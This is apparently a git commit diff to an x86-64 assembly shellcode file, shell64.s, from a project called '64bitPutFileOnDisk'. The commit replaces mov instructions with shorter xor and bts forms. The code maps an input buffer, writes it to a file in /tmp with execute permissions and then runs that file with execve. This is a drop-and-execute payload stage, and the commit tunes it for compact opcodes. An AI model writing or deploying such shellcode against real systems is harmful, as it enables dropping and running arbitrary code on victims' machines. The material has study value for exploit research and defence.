748a54956e1351e5d0395ac9e6a999d1b871b15f
Shark64 <shark@bitchx.it>
2015-05-07 22:45:43 +0200

    Update shell64.s
    try to use shorter opcodes

--- 64bitPutFileOnDisk/shell64.s
+++ 64bitPutFileOnDisk/shell64.s
@@ -25,20 +25,19 @@ main:
 	; r9  = 0
 
 	; mmap(0, 1M, PROT_READ|PROT_WRITE, MAP_PRIVATE, input_fd, 0)
-	mov r8, rdx		; r8 = input
+	;mov r8, rdx		; r8 = input
 
-	xor rdi, rdi		; rdi = 0
+	xor edi, edi		; rdi = 0
 
-	mov rdx, rdi
-	mov rax, rdi
-	mov rcx, rdi
-	mov r8, rdi
-	mov r9, rdi
+	xor edx, edx
+	xor eax, eax
+	xor ecx, ecx
+	xor r8, r8
 
-	mov rsi, rdi
-	mov sil, 0x1
-	shl rsi, 22		; rsi = 4M
-
+	xor esi, esi
+	
+	bts esi, 22		; rsi = 4M
+	xor  r9, r9
 	mov dl, 0x3		; rdx = 0x3
 	mov cl, 0x2		; rdl = 0x2
 
@@ -51,17 +50,17 @@ main:
 	mov r9, rsi		; r9 = size
 
 	; open(filename, O_CREAT|O_RDWR, 0700)
-	xor rax, rax
-	mov rdi, rax
-	mov rdx, rax
+	xor eax, eax
+	xor edi, edi
+	xor edx, edx
 	push rax,
 	push qword stackcookie  ; TODO verify this
 	push 0x706d742f		; stack = /tmp/filename\0
 	mov rdi, rsp		; rdi = stack
-	mov rsi, rax	
+	xor esi, esi	
 	mov sil, 0x42		; ril = O_CREAT|O_RDWR
 	mov dl, 0x7
-	shl dl, 0x6
+	shl edx, 0x6
 	mov al, __NR_open
 	syscall			; call open
 	
@@ -69,14 +68,14 @@ main:
 	mov rdi, rax		; rdi = output
 	mov rsi, r8		; rsi = buffer
 	mov rdx, r9		; rdx = size
-	xor rax, rax
+	xor eax, eax
 	mov al, __NR_write
 	syscall			; call write
 
 	; exec(filename, 0, 0)
 	mov rdi, rsp		; rdi = filename
-	xor rsi, rsi		; rsi = 0
-	mov rdx, rsi		; rdx = 0
-	mov rax, rsi		; rax = 0
+	xor esi, esi		; rsi = 0
+	xor edx, edx		; rdx = 0
+	xor eax, eax		; rax = 0
 	mov al, __NR_execve	
 	syscall			; call execve
